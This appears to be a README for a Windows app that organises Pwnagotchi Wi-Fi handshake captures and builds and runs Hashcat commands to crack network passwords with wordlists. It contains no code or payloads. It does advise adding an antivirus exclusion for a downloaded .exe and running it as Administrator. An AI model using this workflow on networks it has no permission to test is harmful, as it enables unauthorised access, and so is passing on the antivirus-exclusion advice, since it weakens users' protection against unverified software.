# 🛡️ Pwnagotchi_App - Manage your handshake files with ease

[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Matiasv6193/Pwnagotchi_App/releases)

Pwnagotchi_App provides a visual interface to manage your Pwnagotchi handshake files. You organize your captured data and build complex Hashcat commands through simple menus. This tool removes the need for manual terminal commands.

## 🛠️ System Requirements

Ensure your computer meets these requirements before you start:

- Operating System: Windows 10 or Windows 11.
- Processor: Any modern dual-core processor or better.
- Memory: 4 GB of RAM or more.
- Storage: 100 MB of space for the application files.
- Network: A stable connection to transfer handshake files from your Pwnagotchi device.
- Drivers: No specific drivers are required for the application.

## 📥 How to Install

Follow these steps to set up the software on your Windows machine:

1. Visit the [releases page](https://github.com/Matiasv6193/Pwnagotchi_App/releases) to access the download options.
2. Look for the file ending in `.exe` under the latest release version.
3. Click the file name to start the download.
4. Save the file to your desktop or your Downloads folder.
5. Double-click the saved file to begin the installation process.
6. Follow the on-screen prompts to complete the setup.
7. Click the application icon on your desktop to launch the program.

## ⚙️ Using the Application

The interface splits into three core sections: File Management, Hashcat Builder, and Status.

### Manage Handshakes
The file manager allows you to import your `.pcap` files. Click the Open Folder button to select the directory where your Pwnagotchi saves its captures. The app scans the folder and displays a list of available handshakes. You can sort these files by date or size. Select any file to view details such as the access point name and the handshake signal strength.

### Build Hashcat Commands
You do not need to memorize commands. The Hashcat builder offers a series of checkboxes and text boxes. 
- Select the path to your wordlist file using the browse button.
- Choose the specific attack mode from the dropdown menu.
- The app automatically generates the command string at the bottom of the window.
- Click the Run button to execute the command. The application displays the output directly in the window, so you see the progress of your audit.

## 🔍 Understanding Hashcat
Hashcat functions as a tool for security research. It tests the strength of network passwords contained within your handshake files. When you load a wordlist, the software compares the handshake data against the list. If it finds a match, the app displays the password.

## 🚀 Performance Tips

- Keep your wordlists on a fast drive, such as an internal solid-state drive.
- Close other resource-heavy programs while running large audit tasks.
- Save your logs after each session to track your progress over time.
- If the application feels slow, ensure your antivirus software has an exclusion for the application folder.

## ❓ Frequently Asked Questions

### Does this app connect to my Pwnagotchi?
The app manages files stored on your local computer. You must transfer the handshake files from the Pwnagotchi to a folder on your Windows computer first. Use a USB drive or a file transfer utility to copy the data.

### Can I damage my Pwnagotchi with this tool?
No. This tool reads data files from your computer. It does not send information back to your Pwnagotchi device. It only processes files you have already captured.

### What should I do if the app crashes?
Restart the application. If the problem continues, delete the installation folder and install the latest version from the link provided above. Ensure you have the latest updates for your Windows operating system.

### How do I update the application?
Download the newer version from the releases page and run the installer. The installer detects previous versions and updates your settings automatically.

### Is my hardware good enough for this task?
The app runs on standard office hardware. However, the speed of the password audit depends on your computer processor and graphics card. Dedicated graphics hardware significantly improves the speed of these operations.

## 📈 Security Research Guidelines
Use this tool only on networks you own or have explicit permission to test. Unauthorized access to network data violates safety policies and legal standards. Always conduct your research in a controlled environment to ensure your methods remain ethical and secure.

## 📋 Troubleshooting

If you encounter issues during installation or usage, check these common items:
1. Permissions: If the application cannot read your files, right-click the shortcut and select Run as Administrator.
2. Missing Files: Check if your folders contain the correct `.pcap` extension. Files without this extension will not appear in the interface.
3. Path Errors: Ensure your file paths do not contain special characters or symbols that might confuse the command builder. Use simple folder names like `C:\Handshakes`.
4. Updates: Always check the releases page for the version compatible with the latest Windows security patches.